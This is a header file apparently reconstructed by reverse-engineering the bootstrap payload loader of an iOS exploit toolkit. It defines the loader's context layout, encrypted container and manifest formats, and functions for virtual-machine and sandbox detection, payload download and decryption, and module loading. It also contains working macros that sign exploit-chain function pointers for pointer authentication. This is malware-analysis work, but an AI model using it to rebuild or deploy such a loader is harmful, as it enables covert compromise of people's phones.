/*
 * bootstrap.h - Decompiled header for bootstrap.dylib
 *
 * This is a reverse-engineered reconstruction of the Coruna iOS exploit
 * toolkit's bootstrap payload loader. The single export is _process().
 */

#ifndef BOOTSTRAP_H
#define BOOTSTRAP_H

#import <Foundation/Foundation.h>
#import <stdint.h>
#import <stddef.h>
#import <stdbool.h>
#import <mach/mach.h>
#import <string.h>
#ifdef __arm64e__
#import <ptrauth.h>
#endif
#import <ptrauth.h>

/*
 * Sign a raw (unsigned) function pointer for arm64e PAC.
 * The exploit chain's ctx contains raw function pointers; arm64e
 * indirect calls authenticate via blraaz (key A, discriminator 0).
 * Call sign_ctx_fptrs() once in process() to sign all ctx fields
 * before any function pointer calls.
 */

/* ── Error codes ─────────────────────────────────────────────────── */
#define ERR_BASE            0x000A0000
#define ERR_NULL_CTX        (ERR_BASE | 0xD001)   /* 0x000AD001 */
#define ERR_GENERIC         (ERR_BASE | 0xD009)   /* 0x000AD009 */
#define ERR_ALLOC           (ERR_GENERIC + 8)      /* 0x000AD011 */
#define ERR_VIRTUAL_ENV     (ERR_GENERIC + 2)
#define ERR_NO_CONTAINER    0x7003
#define ERR_CONTAINER_FOUND 0x7001
#define ERR_NO_DATA         0x7002
#define ERR_BAD_MAGIC       0x700C
#define ERR_BAD_BOUNDS      0x7005
#define ERR_BAD_SIZE        0x7004
#define ERR_ALLOC_SMALL     (ERR_NULL_CTX + 8)
#define ERR_MMAP_FAIL       0x5008
#define ERR_TASK_INFO       0x5007
#define ERR_VM_ALIGN        0x5006
#define ERR_NO_DLSYM_RESULT 0x5005
#define ERR_NO_MODULE_PTR   0x5004
#define ERR_TIMEOUT         0x3015
#define ERR_HTTP_URL        0x3002
#define ERR_HTTP_URL_LEN    0x3003
#define ERR_HTTP_BODY_ERR   0x3016
#define ERR_HTTP_CT_ERR     0x3017
#define ERR_HTTP_DATA_ERR   0x3018
#define ERR_HTTP_EMPTY_BODY 0x3019
#define ERR_HTTP_MSG        0x3009
#define ERR_HTTP_STREAM     0x300A
#define ERR_HTTP_OPEN       0x300B
#define ERR_HTTP_SSL        0x300C
#define ERR_HTTP_SCHEME     0x300D
#define ERR_HTTP_PROXY      0x300E
#define ERR_HTTP_DICT       0x300F
#define ERR_HTTP_CLIENT     0x3010
#define ERR_HTTP_STATUS     0x3011
#define ERR_HTTP_NO_RESP    0x3005
#define ERR_HTTP_ZERO_LEN   0x3004
#define ERR_HTTP_STREAM_ERR 0x3008
#define ERR_MODULE_NO_VTBL  (0x00028006)
#define ERR_MODULE_NO_INIT  (0x00028002)
#define ERR_MODULE_NO_FUNC  (0x00028006)

/* ── Container type IDs ──────────────────────────────────────────── */
#define CONTAINER_TYPE_DATA     0x50000
#define CONTAINER_TYPE_PAYLOAD  0x70000
#define CONTAINER_TYPE_MODULE   0x80000
#define CONTAINER_TYPE_LOADER   0x90000

/* ── Magic values ────────────────────────────────────────────────── */
#define MAGIC_FOODBEEF      0xF00DBEEF
#define MAGIC_BEDF00D       0x0BEDF00D
#define MAGIC_MANIFEST       0x12345678
#define MANIFEST_ENTRY_OFFSET 0x10C
#define MANIFEST_ENTRY_SIZE   0x64

/* ── SoC identifiers ────────────────────────────────────────────── */
#define SOC_TYPE_A       0x8765EDEA
#define SOC_TYPE_B       0xDA33D83D
#define SOC_TYPE_C       0x1B588BB2
#define SOC_TYPE_D       0x1B588BB3
#define SOC_TYPE_E       0x462504D2
#define SOC_TYPE_F       0x2876F5B5
#define SOC_VM_CHECK_A   0x92FB37C8
#define SOC_VM_CHECK_B   0x37A09642
#define SOC_VM_CHECK_C   0x2C91A47E
#define SOC_DEVICE_B_A   0x07D34B9F
#define SOC_DEVICE_B_B   0xE81E7EF6

/* ── Container slot ──────────────────────────────────────────────── */
#define MAX_CONTAINERS  24
#define CONTAINER_SLOT_SIZE 0x30

typedef struct container_slot {
    uint32_t type;          /* +0x00 */
    uint32_t flags;         /* +0x04 */
    void    *data_ptr;      /* +0x08 */
    uint32_t data_size;     /* +0x10 */
    uint32_t _pad1;         /* +0x14 */
    void    *resolved_ptr;  /* +0x18 */
    uint64_t field_20;      /* +0x20 */
    uint64_t field_28;      /* +0x28 */
} container_slot_t;

/* ── F00DBEEF container entry ────────────────────────────────────── */
typedef struct foodbeef_entry {
    uint32_t type_flags;    /* upper 16 bits = segment type */
    uint32_t flags;         /* typically 0x00000003 */
    uint32_t data_offset;   /* offset within container */
    uint32_t data_size;     /* size of data */
} foodbeef_entry_t;

/* ── F00DBEEF container header ───────────────────────────────────── */
typedef struct foodbeef_header {
    uint32_t magic;         /* 0xF00DBEEF */
    uint32_t entry_count;
    foodbeef_entry_t entries[];
} foodbeef_header_t;

/* ── Module vtable ───────────────────────────────────────────────── */
typedef struct module_vtable {
    uint16_t version;       /* +0x00, expected 2 */
    uint16_t num_funcs;     /* +0x02, expected >= 2 */
    uint64_t _pad;          /* +0x04 */
    void    *fn_deinit;     /* +0x10 */
    void    *fn_init;       /* +0x18 */
    void    *fn_cleanup;    /* +0x20 */
    void    *fn_command;    /* +0x28 */
    void    *fn_30;         /* +0x30 */
    void    *fn_38;         /* +0x38 */
    void    *fn_40;         /* +0x40 */
    void    *fn_48;         /* +0x48 */
} module_vtable_t;

/* ── Module handle ───────────────────────────────────────────────── */
typedef struct module_handle {
    void            *container;   /* +0x00: container pointer */
    module_vtable_t *vtable;      /* +0x08: function table */
} module_handle_t;

/* ── Manifest entry ──────────────────────────────────────────────── */
typedef struct manifest_entry {
    uint32_t flags;          /* +0x00 */
    uint8_t  key[32];        /* +0x04 */
    char     filename[68];   /* +0x24, padded to 0x64 total */
} manifest_entry_t;

/* ── Manifest header ─────────────────────────────────────────────── */
typedef struct manifest_header {
    uint32_t magic;          /* 0x12345678 */
    uint32_t _pad[65];       /* padding to 0x108 */
    uint32_t entry_count;    /* +0x108 */
    /* entries start at +0x10C, each 0x64 bytes */
} manifest_header_t;

/* ── Stream callback context ─────────────────────────────────────── */
typedef struct stream_ctx {
    void    *response_msg;   /* +0x00: CFHTTPMessageRef */
    uint32_t error;          /* +0x08 */
    uint32_t status_code;    /* +0x0C */
} stream_ctx_t;

/* ── Shared memory layout ────────────────────────────────────────── */
/* The shared memory region is used for JS bridge communication:
 *  +0x000000: state word (0=idle, 1=url_only, 3=response_ready, 5=timeout, 7=url+body)
 *  +0x000004: URL string (up to 0x7FFFFF bytes)
 *  +0x7FFFFF: NUL terminator
 *  +0x800000: body data (up to 0x800000 bytes)
 *  +0xFFFFFF: NUL terminator
 */

/* ── Function pointer types ──────────────────────────────────────── */
typedef uint32_t (*fn_consume_buffer_t)(void *ctx, uint32_t size);
typedef uint32_t (*fn_decrypt_t)(void *ctx, void *data, uint32_t size, void *out);
typedef uint32_t (*fn_dlsym_t)(void *ctx, void *handle, const char *sym, void **out);
typedef uint32_t (*fn_download_t)(void *ctx, const char *url, void **out_data, uint32_t *out_size);
typedef uint32_t (*fn_parse_container_t)(void *ctx, uint32_t type, void *data, uint32_t size);
typedef uint32_t (*fn_resolve_all_t)(void *ctx);
typedef uint32_t (*fn_find_or_load_t)(void *ctx, uint32_t type);
typedef uint32_t (*fn_unload_t)(void *ctx, uint32_t type);
typedef uint32_t (*fn_get_pointer_t)(void *ctx, uint32_t type, void **out);
typedef uint32_t (*fn_get_raw_data_t)(void *ctx, uint32_t type, void **out_ptr, uint32_t *out_size);
typedef void     (*fn_icache_flush_t)(void *ctx, void *addr, uint32_t size);
typedef uint32_t (*fn_alloc_buffer_t)(void *ctx, uint32_t size);
typedef uint32_t (*fn_unload_container_t)(void *ctx, void *handle);
typedef void     (*fn_bzero_t)(void *ctx, void *ptr, uint32_t size);
typedef uint32_t (*fn_log_t)(void *ctx, uint32_t error, const char *filename, uint32_t line);

/* ── Main bootstrap context (0x648 bytes) ────────────────────────── */
typedef struct bootstrap_ctx {
    uint8_t  header[0x18];           /* +0x000 */
    uint64_t load_addr;              /* +0x018 */
    uint64_t oa_size;                /* +0x020 */
    fn_consume_buffer_t consume_buf; /* +0x028 */
    fn_decrypt_t decrypt_func;       /* +0x030 */
    fn_dlsym_t   dlsym_func;        /* +0x038 */
    fn_download_t download_func;     /* +0x040 */
    uint8_t *buffer_ptr;             /* +0x048 */
    uint32_t buffer_remaining;       /* +0x050 */
    uint32_t _pad050;                /* +0x054 */
    uint8_t  _pad058[0x10];          /* +0x058 */
    void    *container_data;         /* +0x068 */
    uint32_t container_size;         /* +0x070 */
    uint32_t _pad074;                /* +0x074 */
    char    *base_url;               /* +0x078 */
    char    *secondary_url;          /* +0x080 */
    uint8_t *exec_base;              /* +0x088 */
    uint32_t exec_size;              /* +0x090 */
    uint32_t _pad094;                /* +0x094 */
    uint8_t *key_ptr;                /* +0x098 */
    char    *user_agent;             /* +0x0A0 */
    char    *alt_url;                /* +0x0A8 */
    fn_bzero_t bzero_func;           /* +0x0B0 */
    uint8_t  _padB8[0x08];           /* +0x0B8 */
    uint32_t os_version;             /* +0x0C0: packed (minor<<8 | major<<16 | patch) */
    uint32_t _padC4;                 /* +0x0C4 */
    uint32_t kernel_version;         /* +0x0C8 */
    uint32_t _padCC;                 /* +0x0CC */
    uint64_t xnu_version;            /* +0x0D0 */
    uint32_t soc_version;            /* +0x0D8 */
    uint32_t soc_subversion;         /* +0x0DC */
    uint32_t cpu_type;               /* +0x0E0 */
    uint32_t _padE4;                 /* +0x0E4 */

    /* Function table (6 pointers) */
    fn_parse_container_t fn_parse_container;   /* +0x0E8 */
    fn_resolve_all_t     fn_resolve_all;       /* +0x0F0 */
    fn_find_or_load_t    fn_find_or_load;      /* +0x0F8 */
    fn_unload_t          fn_unload;            /* +0x100 */
    fn_get_pointer_t     fn_get_pointer;       /* +0x108 */
    fn_get_raw_data_t    fn_get_raw_data;      /* +0x110 */

    uint8_t  _pad118[0x08];                    /* +0x118 */
    fn_icache_flush_t    fn_icache_flush;      /* +0x120 */
    fn_alloc_buffer_t    fn_alloc_buffer;      /* +0x128 */
    fn_unload_container_t fn_unload_cont;      /* +0x130 */
    uint32_t *atomic_state;                    /* +0x138 */

    /* 24 container slots, each 0x30 bytes */
    container_slot_t containers[MAX_CONTAINERS]; /* +0x140 ... +0x5BF */

    /* Flags */
    uint8_t  flag_is_release;    /* +0x5C0 */
    uint8_t  flag_device_type;   /* +0x5C1 */
    uint8_t  flag_a;             /* +0x5C2 */
    uint8_t  flag_new_ios;       /* +0x5C3 */
    uint8_t  flag_ready;         /* +0x5C4 */
    uint8_t  flag_b;             /* +0x5C5 */
    uint8_t  _pad5C6;            /* +0x5C6 */
    uint8_t  flag_direct_mem;    /* +0x5C7 */
    uint8_t  _pad5C8[0x08];      /* +0x5C8 */

    /* Memory mapping info */
    uint64_t mmap_base;          /* +0x5D0 */
    uint64_t mmap_secondary;     /* +0x5D8 */

    /* Shared memory and sandbox */
    void    *shared_memory;      /* +0x5E0 */
    uint8_t  is_sandboxed;       /* +0x5E8 */
    uint8_t  flag_a15_features;  /* +0x5E9 */
    uint8_t  _pad5EA;            /* +0x5EA */
    uint8_t  logging_enabled;    /* +0x5EB */
    uint8_t  flag_exit;          /* +0x5EC */
    uint8_t  _pad5ED[0x03];      /* +0x5ED */

    /* Logging and communication */
    fn_log_t log_func;           /* +0x5F0 */
    uint32_t semaphore;          /* +0x5F8: mach semaphore port */
    uint8_t  is_webcontent;      /* +0x5FC */
    uint8_t  _pad5FD[0x03];      /* +0x5FD */

    uint8_t  _pad600[0x40];      /* +0x600 */
    uint64_t cpu_features;       /* +0x640 */
} bootstrap_ctx_t;

_Static_assert(sizeof(bootstrap_ctx_t) == 0x648, "bootstrap_ctx_t size mismatch");

/* ── PAC utilities (pac.c) ───────────────────────────────────────── */
int      has_pac(void);
uint64_t strip_pac(uint64_t ptr);
uint64_t pac_sign_if_needed(uint64_t ptr, uint64_t ctx);
int      check_pac_enabled(void);
uint64_t pacia(uint64_t ptr, uint64_t ctx);
uint64_t pacda(uint64_t ptr, uint64_t ctx);
uint64_t pacib(uint64_t ptr, uint64_t ctx);
uint64_t pacdb(uint64_t ptr, uint64_t ctx);

void     resolve_pac_pointer(int sig, void *info, void *ucontext);

/*
 * Sign raw (unsigned) function pointers in ctx for arm64e PAC.
 * The exploit chain populates ctx with unsigned pointers; arm64e's
 * blraaz (key A, disc 0) requires them signed. Call once in process()
 * before any function pointer calls. Uses memcpy to bypass compiler
 * PAC ops on typed struct field access.
 */
#ifdef __arm64e__
#define SIGN_RAW_FPTR(field) do { \
    void *_raw = NULL; \
    memcpy(&_raw, &(field), sizeof(void *)); \
    if (_raw) { \
        _raw = (void *)pacia((uint64_t)_raw, 0); \
        memcpy(&(field), &_raw, sizeof(void *)); \
    } \
} while (0)
#else
#define SIGN_RAW_FPTR(field) ((void)0)
#endif

static inline void sign_ctx_fptrs(bootstrap_ctx_t *ctx)
{
#ifdef __arm64e__
    SIGN_RAW_FPTR(ctx->consume_buf);
    SIGN_RAW_FPTR(ctx->decrypt_func);
    SIGN_RAW_FPTR(ctx->dlsym_func);
    SIGN_RAW_FPTR(ctx->download_func);
    SIGN_RAW_FPTR(ctx->bzero_func);
    SIGN_RAW_FPTR(ctx->fn_parse_container);
    SIGN_RAW_FPTR(ctx->fn_resolve_all);
    SIGN_RAW_FPTR(ctx->fn_find_or_load);
    SIGN_RAW_FPTR(ctx->fn_unload);
    SIGN_RAW_FPTR(ctx->fn_get_pointer);
    SIGN_RAW_FPTR(ctx->fn_get_raw_data);
    SIGN_RAW_FPTR(ctx->fn_icache_flush);
    SIGN_RAW_FPTR(ctx->fn_alloc_buffer);
    SIGN_RAW_FPTR(ctx->fn_unload_cont);
    SIGN_RAW_FPTR(ctx->log_func);
#endif
}

/*
 * Sign a single void* as a function pointer for arm64e.
 * Use at call sites for one-off unsigned pointers (e.g. dlsym results,
 * vtable entries stored as void*).
 */
#ifdef __arm64e__
#define SIGN_FPTR(type, ptr) \
    ((type)pacia((uint64_t)(ptr), 0))
#else
#define SIGN_FPTR(type, ptr) ((type)(ptr))
#endif

static inline void sign_vtable_fptrs(module_vtable_t *vt)
{
#ifdef __arm64e__
    if (!vt) return;
    /* vtable fields are void* — sign them in-place for arm64e calls */
    if (vt->fn_deinit)  vt->fn_deinit  = (void*)pacia((uint64_t)vt->fn_deinit, 0);
    if (vt->fn_init)    vt->fn_init    = (void*)pacia((uint64_t)vt->fn_init, 0);
    if (vt->fn_cleanup) vt->fn_cleanup = (void*)pacia((uint64_t)vt->fn_cleanup, 0);
    if (vt->fn_command) vt->fn_command = (void*)pacia((uint64_t)vt->fn_command, 0);
#endif
}

/* ── Cache and memory (memory.c) ─────────────────────────────────── */
void     flush_icache(bootstrap_ctx_t *ctx, void *addr, uint32_t size);
uint32_t alloc_buffer(bootstrap_ctx_t *ctx, uint32_t size);
void*    consume_buffer(bootstrap_ctx_t *ctx, uint32_t size);
uint32_t secure_bzero(bootstrap_ctx_t *ctx, void *ptr, uint32_t size);
uint32_t setup_memory(bootstrap_ctx_t *ctx);

/* ── System info (sysinfo.c) ─────────────────────────────────────── */
int      get_os_version(uint32_t *out);
uint32_t check_virtual_env(uint8_t *result);
int      check_device_a(uint8_t *out);
int      check_device_b(uint8_t *out);
uint32_t init_system_info(bootstrap_ctx_t *ctx);
void*    read_plist(const char *path);

/* ── Container management (container.c) ──────────────────────────── */
uint32_t parse_foodbeef(bootstrap_ctx_t *ctx, uint32_t type, void *data, uint32_t size);
uint32_t resolve_all_containers(bootstrap_ctx_t *ctx);
uint32_t find_or_load_container(bootstrap_ctx_t *ctx, uint32_t type);
uint32_t unload_container(bootstrap_ctx_t *ctx, uint32_t type);
uint32_t get_container_ptr(bootstrap_ctx_t *ctx, uint32_t type, void **out);
uint32_t get_raw_data(bootstrap_ctx_t *ctx, uint32_t type, void **out_ptr, uint32_t *out_size);
uint32_t init_function_table(bootstrap_ctx_t *ctx);

/* ── Module management (container.c) ─────────────────────────────── */
uint32_t load_module(bootstrap_ctx_t *ctx, uint32_t type, void **out);
uint32_t load_module_wrapper(bootstrap_ctx_t *ctx, void **out);
uint32_t module_call_init(module_handle_t *handle, uint32_t mode, void **out);
uint32_t module_call_cmd(module_handle_t *handle, void *arg1, uint32_t cmd, void *arg3);
uint32_t module_call_cleanup(module_handle_t *handle, void *arg);
uint32_t close_module(bootstrap_ctx_t *ctx, module_handle_t *handle);

/* ── Crypto (crypto.c) ───────────────────────────────────────────── */
void     chacha20_encrypt(uint8_t *key, uint8_t *data, uint64_t size);
uint32_t decompress(void **ptr_to_data, uint32_t *ptr_to_size);

/* ── HTTP (http.c) ───────────────────────────────────────────────── */
uint32_t http_request(const char *url, const char *user_agent,
                      const char *content_type, const char *body,
                      void **out_data, uint32_t *out_size);

/* ── Logging (logging.c) ─────────────────────────────────────────── */
void print_log(const char *fmt, ...);
uint32_t send_log(bootstrap_ctx_t *ctx, const char *url,
                  void **out_data, uint32_t *out_size);
uint32_t format_and_send(const char *url, const char *ua,
                         const char *body_fmt, ...);
uint32_t format_log_entry(void **out_ptr, uint32_t *out_size,
                          const char *fmt, ...);
uint32_t send_report(bootstrap_ctx_t *ctx, uint32_t error,
                     const char *filename, uint32_t line);
uint32_t format_string(void **out_ptr, uint32_t *out_size,
                       const char *fmt, ...);

/* ── Communication (logging.c) ───────────────────────────────────── */
uint32_t init_communication(bootstrap_ctx_t *ctx);
uint32_t shared_mem_download(bootstrap_ctx_t *ctx, const char *url,
                             const char *body, uint32_t timeout,
                             void **out_data, uint32_t *out_size);

/* ── Download pipeline (download.c) ──────────────────────────────── */
int      is_a15_or_newer(bootstrap_ctx_t *ctx);
uint32_t download_retries(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                          char *url_buf, uint32_t url_size, void **key_out);
uint32_t download_manifest(bootstrap_ctx_t *ctx, uint32_t flags,
                           void *manifest, uint32_t manifest_size,
                           char *url_buf, uint32_t url_size, void **key_out);
uint32_t download_flags(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                        char *url_buf, uint32_t url_size, void **key_out);
uint32_t download_and_process(bootstrap_ctx_t *ctx, uint32_t type,
                              void **out_ptr, uint32_t *out_size);
uint32_t get_arch_flags(bootstrap_ctx_t *ctx);
uint32_t download_decrypt(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                          void *key, void **out_ptr, uint32_t *out_size);
uint32_t check_sandbox(bootstrap_ctx_t *ctx, uint8_t *out);
uint32_t init_sandbox_and_ua(bootstrap_ctx_t *ctx);

/* ── Main entry (main.c) ────────────────────────────────────────── */
uint32_t process_payload(bootstrap_ctx_t *ctx, const char *url,
                         uint32_t unused, uint32_t *result);
void*    thread_main(bootstrap_ctx_t *ctx);

/* ── Exported symbol ─────────────────────────────────────────────── */
uint32_t process(bootstrap_ctx_t *ctx);

/* ── Stream callback (http.c) ────────────────────────────────────── */
void     stream_read_callback(void *stream, int event, void *info);

#endif /* BOOTSTRAP_H */
